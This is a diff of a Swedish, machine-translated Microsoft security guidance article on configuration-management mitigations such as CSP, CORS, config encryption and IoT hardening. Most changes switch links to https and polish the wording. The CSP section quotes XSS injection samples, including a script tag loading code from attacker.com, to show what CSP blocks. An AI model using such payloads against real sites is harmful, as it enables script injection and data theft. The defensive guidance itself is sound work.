@@ -14,12 +14,12 @@ ms.devlang: na
 ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
-ms.openlocfilehash: b24d32afed5acfd846f9a8e8316339665524ad2e
-ms.sourcegitcommit: 11d8ce8cd720a1ec6ca130e118489c6459e04114
+ms.openlocfilehash: bd1d3c71660ae584b0aa57c7cc765fdc519f4b1b
+ms.sourcegitcommit: 5839af386c5a2ad46aaaeb90a13065ef94e61e74
 ms.translationtype: MT
 ms.contentlocale: sv-SE
-ms.lasthandoff: 12/04/2018
-ms.locfileid: "52849776"
+ms.lasthandoff: 03/19/2019
+ms.locfileid: "57863601"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>Security ram: Konfigurationshantering | Åtgärder 
 | Produkt/tjänst | Artikel |
@@ -28,22 +28,22 @@ ms.locfileid: "52849776"
 | **Databas** | <ul><li>[Konfigurera en Windows-brandvägg för Databasmotoråtkomst](#firewall-db)</li></ul> |
 | **Webb-API** | <ul><li>[Se till att endast betrodda ursprung är tillåtna om CORS har aktiverats på ASP.NET Web API](#cors-api)</li><li>[Kryptera avsnitt i konfigurationsfilerna för webb-API som innehåller känslig information](#config-sensitive)</li></ul> |
 | **IoT-enheter** | <ul><li>[Se till att alla administrationsgränssnitt säkras med starka autentiseringsuppgifter](#admin-strong)</li><li>[Se till att okänd kod inte kan köras på enheter](#unknown-exe)</li><li>[Kryptera OS och fler partitioner av IoT-enheter med BitLocker](#partition-iot)</li><li>[Kontrollera att endast de minsta tjänster/funktionerna som är aktiverade på enheter](#min-enable)</li></ul> |
-| **IoT-fält-Gateway** | <ul><li>[Kryptera OS och fler partitioner av IoT fält-Gateway med BitLocker](#field-bit-locker)</li><li>[Se till att standard-inloggningsuppgifter för fält-gateway ändras under installationen](#default-change)</li></ul> |
-| **IoT-molnet Gateway** | <ul><li>[Kontrollera att Molngatewayen använder en process för att hålla den anslutna enheter inbyggda programvaran uppdaterad](#cloud-firmware)</li></ul> |
+| **IoT Field Gateway** | <ul><li>[Kryptera OS och fler partitioner av IoT fält-Gateway med BitLocker](#field-bit-locker)</li><li>[Se till att standard-inloggningsuppgifter för fält-gateway ändras under installationen](#default-change)</li></ul> |
+| **IoT Cloud Gateway** | <ul><li>[Kontrollera att Molngatewayen använder en process för att hålla den anslutna enheter inbyggda programvaran uppdaterad](#cloud-firmware)</li></ul> |
 | **Datorn Förtroendegräns** | <ul><li>[Se till att enheter har slutpunkt säkerhetskontroller som konfigurerats enligt organisationens principer](#controls-policies)</li></ul> |
 | **Azure Storage** | <ul><li>[Se till att säker hantering av nycklar för Azure storage-åtkomst](#secure-keys)</li><li>[Se till att endast betrodda ursprung är tillåtna om CORS har aktiverats på Azure storage](#cors-storage)</li></ul> |
 | **WCF** | <ul><li>[Aktivera begränsning funktionens WCF-tjänsten](#throttling)</li><li>[WCF-utlämnande via metadata](#info-metadata)</li></ul> | 
 
 ## <a id="csp-js"></a>Implementera Content Security Policy (CSP) och inaktivera infogade javascript
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webbprogram | 
 | **SDL fas**               | Utveckla |  
 | **Tillämpliga tekniker** | Generisk |
 | **Attribut**              | Gäller inte  |
-| **Referenser**              | [En introduktion till innehåll säkerhetsprincip](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [innehåll Security principreferens](http://content-security-policy.com/), [säkerhetsfunktioner](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [introduktion till innehåll säkerhetsprincip](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) , [Kan jag använda CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
-| **Steg** | <p>Content Security Policy (CSP) är en skydd på djupet säkerhetsmekanism, en W3C som standard, som gör det möjligt för web application ägare att ha kontroll på det innehåll som är inbäddad i sin plats. CSP: N har lagts till som en HTTP-Svarsrubrik på webbservern och tillämpas på klientsidan som webbläsare. Det är en lista över tillåtna-baserad princip – en webbplats kan deklarera en uppsättning betrodda domäner från det aktiva innehållet, t.ex. JavaScript kan läsas in.</p><p>CSP ger följande säkerhet fördelar:</p><ul><li>**Skydd mot XSS:** om en sida är sårbar för XSS kan en angripare kan utnyttja den på 2 sätt:<ul><li>Mata in `<script>malicious code</script>`. Den här utnyttja fungerar inte på grund av CSP grundläggande begränsning-1</li><li>Mata in `<script src=”http://attacker.com/maliciousCode.js”/>`. Den här utnyttja fungerar inte eftersom angripare kontrollerad domän inte kan CSP-vitlistan domäner</li></ul></li><li>**Kontroll över dataexfiltrering:** om skadliga innehåll på en webbsida försöker ansluta till en extern webbplats och stjäla data, anslutningen kommer att avbrytas av CSP: N. Det beror på att domänen inte CSP-vitlistan</li><li>**Skydd mot Klicka fästpunkter:** Klicka fästpunkter är en attack-teknik med som en angripare kan inrikta en äkta webbplats och tvinga användare att klicka på UI-element. För närvarande uppnås skydd mot Klicka fästpunkter genom att konfigurera ett svar-X-ram – Rubrikalternativ. Den här rubriken värnar om inte alla webbläsare och gå framåt CSP blir ett standardiserat sätt att skydda mot fästpunkter klickar du på</li><li>**Rapportering i realtid attack:** om en-angrepp på en webbplats med CSP-aktiverad webbläsare som automatiskt ska utlösa en avisering till en slutpunkt som konfigurerats på webbservern. På så sätt kan CSP fungerar som en i realtid varningssystem.</li></ul> |
+| **Referenser**              | [En introduktion till innehåll säkerhetsprincip](https://www.html5rocks.com/en/tutorials/security/content-security-policy/), [innehåll Security principreferens](https://content-security-policy.com/), [säkerhetsfunktioner](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [introduktion till innehåll säkerhetsprincip](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy) , [Kan jag använda CSP?](https://caniuse.com/#feat=contentsecuritypolicy) |
+| **Steg** | <p>Content Security Policy (CSP) är en skydd på djupet säkerhetsmekanism, en W3C som standard, som gör det möjligt för web application ägare att ha kontroll på det innehåll som är inbäddad i sin plats. CSP: N har lagts till som en HTTP-Svarsrubrik på webbservern och tillämpas på klientsidan som webbläsare. Det är en lista över tillåtna-baserad princip – en webbplats kan deklarera en uppsättning betrodda domäner från det aktiva innehållet, t.ex. JavaScript kan läsas in.</p><p>CSP ger följande säkerhet fördelar:</p><ul><li>**Skydd mot XSS:** Om en sida är sårbar för XSS kan kan en angripare utnyttja den på 2 sätt:<ul><li>Mata in `<script>malicious code</script>`. Den här utnyttja fungerar inte på grund av CSP grundläggande begränsning-1</li><li>Mata in `<script src=”http://attacker.com/maliciousCode.js”/>`. Den här utnyttja fungerar inte eftersom angripare kontrollerad domän inte kan CSP-vitlistan domäner</li></ul></li><li>**Kontroll över dataexfiltrering:** Om skadlig innehåll på en webbsida försöker ansluta till en extern webbplats och stjäla data, avbryts anslutningen av CSP: N. Det beror på att domänen inte CSP-vitlistan</li><li>**Skydd mot Klicka fästpunkter:** Klicka fästpunkter är en attack-teknik med som en angripare kan inrikta en äkta webbplats och tvinga användare att klicka på UI-element. För närvarande uppnås skydd mot Klicka fästpunkter genom att konfigurera ett svar-X-ram – Rubrikalternativ. Den här rubriken värnar om inte alla webbläsare och gå framåt CSP blir ett standardiserat sätt att skydda mot fästpunkter klickar du på</li><li>**I realtid attack rapporteringsserver:** Om det finns en-angrepp på en webbplats med CSP-aktiverad, sätts webbläsare automatiskt ett meddelande till en slutpunkt som konfigurerats på webbservern. På så sätt kan CSP fungerar som en i realtid varningssystem.</li></ul> |
 
 ### <a name="example"></a>Exempel
 Exempel på princip: 
@@ -68,7 +68,7 @@ Example: var str="alert(1)"; eval(str);
 
 ## <a id="xss-filter"></a>Aktivera webbläsarens XSS-filter
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webbprogram | 
 | **SDL fas**               | Utveckla |  
@@ -79,18 +79,18 @@ Example: var str="alert(1)"; eval(str);
 
 ## <a id="trace-deploy"></a>ASP.NET-program måste du inaktivera spårning och felsökning före distributionen
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webbprogram | 
 | **SDL fas**               | Utveckla |  
 | **Tillämpliga tekniker** | Generisk |
 | **Attribut**              | Gäller inte  |
-| **Referenser**              | [ASP.NET-felsökning översikt](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET spårning översikt](http://msdn2.microsoft.com/library/bb386420.aspx), [så här: Aktivera spårning för ett ASP.NET-program](http://msdn2.microsoft.com/library/0x5wc973.aspx), [så här: aktivera felsökning för ASP.NET-program](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
+| **Referenser**              | [ASP.NET-felsökning översikt](https://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET spårning översikt](https://msdn2.microsoft.com/library/bb386420.aspx), [så här: Aktivera spårning för ett ASP.NET-program](https://msdn2.microsoft.com/library/0x5wc973.aspx), [så här: Aktivera felsökning för ASP.NET-program](https://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
 | **Steg** | När spårning är aktiverat för sidan varje webbläsare som begär den hämtar även spårningsinformation som innehåller data om interna Servertillstånd och arbetsflöde. Den här informationen kan vara känslig säkerhet. När felsökning är aktiverat för sidan, leda fel händer på servern till en fullständig stack spårningsdata som visas i webbläsaren. Dessa data kan exponera känsliga information om serverns arbetsflöde. |
 
 ## <a id="js-trusted"></a>Åtkomst från tredje part JavaScript-skript från betrodda källor
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webbprogram | 
 | **SDL fas**               | Utveckla |  
@@ -101,7 +101,7 @@ Example: var str="alert(1)"; eval(str);
 
 ## <a id="ui-defenses"></a>Se till att autentiserade ASP.NET-sidor införliva Användargränssnittet Redressing eller klicka på fästpunkter försvar
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webbprogram | 
 | **SDL fas**               | Utveckla |  
@@ -136,7 +136,7 @@ Web.config kod för platser som bara bör utformas av sidor i samma domän:
 
 ## <a id="cors-aspnet"></a>Se till att endast betrodda ursprung är tillåtna om CORS har aktiverats på ASP.NET-webbprogram
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webbprogram | 
 | **SDL fas**               | Utveckla |  
@@ -152,7 +152,7 @@ Om åtkomst till Web.config är tillgänglig kan CORS läggas med följande kod:
     <httpProtocol>
       <customHeaders>
         <clear />
-        <add name="Access-Control-Allow-Origin" value="http://example.com" />
+        <add name="Access-Control-Allow-Origin" value="https://example.com" />
       </customHeaders>
     </httpProtocol>
 ```
@@ -160,20 +160,20 @@ Om åtkomst till Web.config är tillgänglig kan CORS läggas med följande kod:
 ### <a name="example"></a>Exempel
 Om det inte går att få åtkomst till web.config, konfigureras CORS genom att lägga till följande c#-kod: 
 ```csharp
-HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
+HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
 ```
 
 Observera att det är viktigt att se till att listan med ursprung i ”Access-Control-Allow-Origin”-attribut har angetts till en begränsad och betrodda uppsättning ursprung. Inte kan konfigurera detta på ett olämpligt sätt (t.ex. ställa in värdet som ' *') gör att skadliga webbplatser att utlösa mellan origin-begäranden till webbprogrammet > utan begränsningar, vilket gör programmet sårbara för CSRF-attacker. 
 
 ## <a id="validate-aspnet"></a>Aktivera ValidateRequest attributet på ASP.NET-sidor
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webbprogram | 
 | **SDL fas**               | Utveckla |  
 | **Tillämpliga tekniker** | Webbformulär, MVC5 |
 | **Attribut**              | Gäller inte  |
-| **Referenser**              | [Begära verifiering - att förhindra attacker skript](http://www.asp.net/whitepapers/request-validation) |
+| **Referenser**              | [Begära verifiering - att förhindra attacker skript](https://www.asp.net/whitepapers/request-validation) |
 | **Steg** | <p>Begäran om verifiering, en funktion i ASP.NET sedan version 1.1, förhindrar att servern tar emot innehåll som innehåller icke kodade HTML. Den här funktionen är utformad för att förhindra vissa skript-inmatningsattacker där klienten skriptkod eller HTML kan vara omedvetet skickas till en server, lagras och sedan presenteras för andra användare. Fortfarande rekommenderar vi att du verifierar att alla indata och HTML koda det när det är lämpligt.</p><p>Begäran om verifiering utförs genom att jämföra alla indata till en lista över kan vara skadliga. Om en matchning uppstår, ASP.NET genererar en `HttpRequestValidationException`. Begära verifiering funktionen är aktiverad som standard.</p>|
 
 ### <a name="example"></a>Exempel
@@ -193,24 +193,24 @@ Observera att begära valideringsfunktionen stöds inte och är inte en del av M
 
 ## <a id="local-js"></a>Använd lokalt värdbaserade senaste versionerna av JavaScript-bibliotek
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webbprogram | 
 | **SDL fas**               | Utveckla |  
 | **Tillämpliga tekniker** | Generisk |
 | **Attribut**              | Gäller inte  |
 | **Referenser**              | Gäller inte  |
-| **Steg** | <p>Utvecklare som använder standard JavaScript-bibliotek som måste använda JQuery godkända versioner av vanliga JavaScript-bibliotek som inte innehåller kända säkerhetsbrister. Ett bra tips är att använda den mest senaste versionen av bibliotek, eftersom de innehåller security korrigeringar av kända sårbarheter i äldre version.</p><p>Om den senaste versionen inte kan användas på grund av kompatibilitetsskäl, den nedan minimiversioner ska användas.</p><p>Godkända minsta versioner:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery verifiera 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery cykel 2,99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**AJAX kontroll Toolkit**<ul><li>AJAX kontroll Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms och Ajax**<ul><li>ASP.NET Web Forms och Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Ladda aldrig något JavaScript-bibliotek från externa webbplatser som offentliga CDN-nät</p>|
+| **Steg** | <p>Utvecklare som använder standard JavaScript-bibliotek som måste använda JQuery godkända versioner av vanliga JavaScript-bibliotek som inte innehåller kända säkerhetsbrister. Ett bra tips är att använda den mest senaste versionen av bibliotek, eftersom de innehåller security korrigeringar av kända sårbarheter i äldre version.</p><p>Om den senaste versionen inte kan användas på grund av kompatibilitetsskäl, den nedan minimiversioner ska användas.</p><p>Godkända minsta versioner:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery verifiera 1.9</li><li>JQuery Mobile 1.0.1</li><li>JQuery cykel 2,99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET Web Forms och Ajax**<ul><li>ASP.NET Web Forms och Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Ladda aldrig något JavaScript-bibliotek från externa webbplatser som offentliga CDN-nät</p>|
 
 ## <a id="mime-sniff"></a>Inaktivera automatisk MIME-kontroll
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webbprogram | 
 | **SDL fas**               | Utveckla |  
 | **Tillämpliga tekniker** | Generisk |
 | **Attribut**              | Gäller inte  |
-| **Referenser**              | [En del IE8 Security V: heltäckande skydd](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-typ](http://en.wikipedia.org/wiki/Mime_type) |
+| **Referenser**              | [IE8 En del Security V: Heltäckande skydd](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-typ](https://en.wikipedia.org/wiki/Mime_type) |
 | **Steg** | Rubriken X-innehåll-typ-Options är ett HTTP-huvud som gör att utvecklare kan ange att innehållet inte ska vara MIME-någon lyssnar. Den här rubriken är utformad för att minska MIME-kontroll attacker. För varje sida som kan innehålla användare kontrolleras innehåll, måste du använda HTTP-huvud X-innehåll-typ-alternativ: nosniff. Om du vill aktivera nödvändiga huvudet globalt för alla sidor i programmet, kan du göra något av följande|
 
 ### <a name="example"></a>Exempel
@@ -269,7 +269,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 ## <a id="standard-finger"></a>Ta bort standardserver rubriker på Windows Azure Web Sites att undvika fingeravtryck
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webbprogram | 
 | **SDL fas**               | Utveckla |  
@@ -280,7 +280,7 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 ## <a id="firewall-db"></a>Konfigurera en Windows-brandvägg för Databasmotoråtkomst
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Databas | 
 | **SDL fas**               | Utveckla |  
@@ -291,13 +291,13 @@ this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 
 ## <a id="cors-api"></a>Se till att endast betrodda ursprung är tillåtna om CORS har aktiverats på ASP.NET Web API
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webb-API | 
 | **SDL fas**               | Utveckla |  
 | **Tillämpliga tekniker** | MVC 5 |
 | **Attribut**              | Gäller inte  |
-| **Referenser**              | [Aktivera Cross-Origin-begäranden i ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET webb-API - CORS-stöd i ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
+| **Referenser**              | [Aktivera Cross-Origin-begäranden i ASP.NET Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET webb-API - CORS-stöd i ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
 | **Steg** | <p>Webbläsarskydd förhindrar att en webbsida gör AJAX-begäranden till en annan domän. Den här begränsningen kallas för princip om samma ursprung och förhindrar skadliga webbplatser från att läsa känsliga data från en annan plats. Men kan ibland det bli ombedd att använda API: er på ett säkert sätt som andra platser kan använda. Mellan Origin Resource Sharing (CORS) är en W3C-standard som gör att en server att lätta princip om samma ursprung.</p><p>Med hjälp av CORS, kan en server uttryckligen tillåta vissa cross-origin-begäranden medan andra avvisas. CORS är säkrare och mer flexibel än tidigare tekniker, till exempel JSONP.</p>|
 
 ### <a name="example"></a>Exempel
@@ -367,7 +367,7 @@ Observera att det är viktigt att se till att listan med ursprung i EnableCors a
 ### <a name="example"></a>Exempel
 Om du vill inaktivera CORS på en viss metod i en klass, kan DisableCors-attributet användas som visas nedan: 
 ```csharp
-[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
+[EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
 public class ResourcesController : ApiController
 {
   public HttpResponseMessage Put(Resource data)
@@ -387,7 +387,7 @@ public class ResourcesController : ApiController
 }
 ```
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webb-API | 
 | **SDL fas**               | Utveckla |  
@@ -396,7 +396,7 @@ public class ResourcesController : ApiController
 | **Referenser**              | [Aktivera Cross-Origin-begäranden (CORS) i ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
 | **Steg** | <p>I ASP.NET Core 1.0 kan CORS aktiveras antingen med hjälp av middleware eller MVC. När du använder MVC för att aktivera CORS samma CORS-tjänster används CORS-mellanprogram är dock inte.</p>|
 
-**Metod 1** aktiverar CORS med mellanprogram: aktivera CORS för hela programmet Lägg till CORS-mellanprogram på begäran-pipelinen med hjälp av metoden UseCors tillägget. En princip för resursdelning mellan ursprung kan anges när du lägger till CORS-mellanprogram med hjälp av klassen CorsPolicyBuilder. Det finns två sätt att göra detta:
+**Metod 1** aktiverar CORS med mellanprogram: Lägg till CORS-mellanprogram i förfrågnings-pipelinen med hjälp av metoden UseCors tillägget om du vill aktivera CORS för hela programmet. En princip för resursdelning mellan ursprung kan anges när du lägger till CORS-mellanprogram med hjälp av klassen CorsPolicyBuilder. Det finns två sätt att göra detta:
 
 ### <a name="example"></a>Exempel
 Först är att anropa UseCors med en lambda. Lambda tar ett CorsPolicyBuilder-objekt: 
@@ -404,7 +404,7 @@ Först är att anropa UseCors med en lambda. Lambda tar ett CorsPolicyBuilder-ob
 public void Configure(IApplicationBuilder app)
 {
     app.UseCors(builder =>
-        builder.WithOrigins("http://example.com")
+        builder.WithOrigins("https://example.com")
         .WithMethods("GET", "POST", "HEAD")
         .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
 }
@@ -418,7 +418,7 @@ public void ConfigureServices(IServiceCollection services)
     services.AddCors(options =>
     {
         options.AddPolicy("AllowSpecificOrigin",
-            builder => builder.WithOrigins("http://example.com"));
+            builder => builder.WithOrigins("https://example.com"));
     });
 }
 public void Configure(IApplicationBuilder app)
@@ -431,10 +431,10 @@ public void Configure(IApplicationBuilder app)
 }
 ```
 
-**Metod 2** aktiverar CORS i MVC: utvecklare kan också använda MVC för att tillämpa specifika CORS per åtgärd per styrenhet eller globalt för alla domänkontrollanter.
+**Metod 2** aktiverar CORS i MVC: Utvecklare kan också använda MVC för att tillämpa specifika CORS per åtgärd per styrenhet eller globalt för alla domänkontrollanter.
 
 ### <a name="example"></a>Exempel
-Per åtgärd: Ange en CORS-princip för en specifik åtgärd lägger du till [EnableCors] attribut för åtgärden. Ange namnet på principen. 
+Per åtgärd: Lägg till attributet [EnableCors] för åtgärden om du vill ange en CORS-princip för en viss åtgärd. Ange namnet på principen. 
 ```csharp
 public class HomeController : Controller
 {
@@ -454,7 +454,7 @@ public class HomeController : Controller
 ```
 
 ### <a name="example"></a>Exempel
-Globalt: 
+Globally: 
 ```csharp
 public void ConfigureServices(IServiceCollection services)
 {
@@ -479,18 +479,18 @@ Inaktivera CORS för en domänkontrollant eller en åtgärd med attributet [Disa
 
 ## <a id="config-sensitive"></a>Kryptera avsnitt i konfigurationsfilerna för webb-API som innehåller känslig information
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Webb-API | 
 | **SDL fas**               | Distribution |  
 | **Tillämpliga tekniker** | Generisk |
 | **Attribut**              | Gäller inte  |
-| **Referenser**              | [Så här: Kryptera konfigurationsavsnitt i ASP.NET 2.0 med hjälp av DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [att ange en Konfigurationsprovider för skyddade](https://msdn.microsoft.com/library/68ze1hb2.aspx), [med hjälp av Azure Key Vault för att skydda programhemligheter](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
+| **Referenser**              | [Anvisningar: Kryptera konfigurationsavsnitt i ASP.NET 2.0 med hjälp av DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [att ange en Konfigurationsprovider för skyddade](https://msdn.microsoft.com/library/68ze1hb2.aspx), [med hjälp av Azure Key Vault för att skydda programhemligheter](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
 | **Steg** | Konfigurationsfiler, till exempel Web.config, appsettings.json ofta används för att lagra känslig information, inklusive användarnamn, lösenord, anslutningssträngar för databasen och krypteringsnycklar. Om du inte skyddar den här informationen kan är ditt program sårbar för attacker eller illvilliga användare att känslig information som användarnamn och lösenord, databasnamn och servernamn. Baserat på typen av distribution (azure/on-premises), kryptera känsliga grupper i konfigurationsfiler med hjälp av DPAPI eller tjänster som Azure Key Vault. |
 
 ## <a id="admin-strong"></a>Se till att alla administrationsgränssnitt säkras med starka autentiseringsuppgifter
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | IoT-enheter | 
 | **SDL fas**               | Distribution |  
@@ -501,7 +501,7 @@ Inaktivera CORS för en domänkontrollant eller en åtgärd med attributet [Disa
 
 ## <a id="unknown-exe"></a>Se till att okänd kod inte kan köras på enheter
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | IoT-enheter | 
 | **SDL fas**               | Utveckla |  
@@ -512,7 +512,7 @@ Inaktivera CORS för en domänkontrollant eller en åtgärd med attributet [Disa
 
 ## <a id="partition-iot"></a>Kryptera OS och fler partitioner av IoT-enheter med BitLocker
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | IoT-enheter | 
 | **SDL fas**               | Utveckla |  
@@ -523,7 +523,7 @@ Inaktivera CORS för en domänkontrollant eller en åtgärd med attributet [Disa
 
 ## <a id="min-enable"></a>Kontrollera att endast de minsta tjänster/funktionerna som är aktiverade på enheter
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | IoT-enheter | 
 | **SDL fas**               | Distribution |  
@@ -534,9 +534,9 @@ Inaktivera CORS för en domänkontrollant eller en åtgärd med attributet [Disa
 
 ## <a id="field-bit-locker"></a>Kryptera OS och fler partitioner av IoT fält-Gateway med BitLocker
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
-| **Komponent**               | IoT-fält-Gateway | 
+| **Komponent**               | IoT Field Gateway | 
 | **SDL fas**               | Distribution |  
 | **Tillämpliga tekniker** | Generisk |
 | **Attribut**              | Gäller inte  |
@@ -545,9 +545,9 @@ Inaktivera CORS för en domänkontrollant eller en åtgärd med attributet [Disa
 
 ## <a id="default-change"></a>Se till att standard-inloggningsuppgifter för fält-gateway ändras under installationen
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
-| **Komponent**               | IoT-fält-Gateway | 
+| **Komponent**               | IoT Field Gateway | 
 | **SDL fas**               | Distribution |  
 | **Tillämpliga tekniker** | Generisk |
 | **Attribut**              | Gäller inte  |
@@ -556,9 +556,9 @@ Inaktivera CORS för en domänkontrollant eller en åtgärd med attributet [Disa
 
 ## <a id="cloud-firmware"></a>Kontrollera att Molngatewayen använder en process för att hålla den anslutna enheter inbyggda programvaran uppdaterad
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
-| **Komponent**               | IoT-molnet Gateway | 
+| **Komponent**               | IoT Cloud Gateway | 
 | **SDL fas**               | Utveckla |  
 | **Tillämpliga tekniker** | Generisk |
 | **Attribut**              | Gateway - valet i Azure IoT Hub |
@@ -567,7 +567,7 @@ Inaktivera CORS för en domänkontrollant eller en åtgärd med attributet [Disa
 
 ## <a id="controls-policies"></a>Se till att enheter har slutpunkt säkerhetskontroller som konfigurerats enligt organisationens principer
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Datorn Förtroendegräns | 
 | **SDL fas**               | Distribution |  
@@ -578,18 +578,18 @@ Inaktivera CORS för en domänkontrollant eller en åtgärd med attributet [Disa
 
 ## <a id="secure-keys"></a>Se till att säker hantering av nycklar för Azure storage-åtkomst
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Azure Storage | 
 | **SDL fas**               | Distribution |  
 | **Tillämpliga tekniker** | Generisk |
 | **Attribut**              | Gäller inte  |
 | **Referenser**              | [Säkerhetsguiden för Azure Storage - hantera Your Storage Account Keys](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
-| **Steg** | <p>Lagring: Vi rekommenderar att lagra åtkomstnycklar för Azure-lagring i Azure Key Vault som en hemlighet och har de program som hämta nyckeln från key vault. Detta rekommenderas på grund av följande orsaker:</p><ul><li>Programmet har aldrig storage viktiga hårdkodad i en konfigurationsfil, vilket tar bort den minimering av någon får åtkomst till nycklarna utan uttryckligt tillstånd</li><li>Åtkomst till nycklarna kan kontrolleras med hjälp av Azure Active Directory. Det innebär att du Kontoägare kan bevilja åtkomst till handfull program som behöver hämta nycklarna från Azure Key Vault. Andra program kan inte till nycklarna utan att ge dem behörighet specifikt</li><li>Åtkomstnyckeln återskapades: Rekommenderar vi att du har en process att återskapa åtkomstnycklarna för Azure-lagring av säkerhetsskäl. Information om varför och hur du planerar för nycklar finns dokumenterade i referensartikeln säkerhetsguiden för Azure Storage</li></ul>|
+| **Steg** | <p>Lagring: Vi rekommenderar att lagra åtkomstnycklar för Azure-lagring i Azure Key Vault som en hemlighet och har de program som hämta nyckeln från key vault. Detta rekommenderas på grund av följande orsaker:</p><ul><li>Programmet har aldrig storage viktiga hårdkodad i en konfigurationsfil, vilket tar bort den minimering av någon får åtkomst till nycklarna utan uttryckligt tillstånd</li><li>Åtkomst till nycklarna kan kontrolleras med hjälp av Azure Active Directory. Det innebär att du Kontoägare kan bevilja åtkomst till handfull program som behöver hämta nycklarna från Azure Key Vault. Andra program kan inte till nycklarna utan att ge dem behörighet specifikt</li><li>Åtkomstnyckeln återskapades: Vi rekommenderar att du har en process att återskapa åtkomstnycklarna för Azure-lagring av säkerhetsskäl. Information om varför och hur du planerar för nycklar finns dokumenterade i referensartikeln säkerhetsguiden för Azure Storage</li></ul>|
 
 ## <a id="cors-storage"></a>Se till att endast betrodda ursprung är tillåtna om CORS har aktiverats på Azure storage
 
-| Titel                   | Information      |
+| Rubrik                   | Information      |
 | ----------------------- | ------------ |
 | **Komponent**               | Azure Storage | 
 | **SDL fas**               | Utveckla |  
@@ -600,14 +600,14 @@ Inaktivera CORS för en domänkontrollant eller en åtgärd med attributet [Disa
 
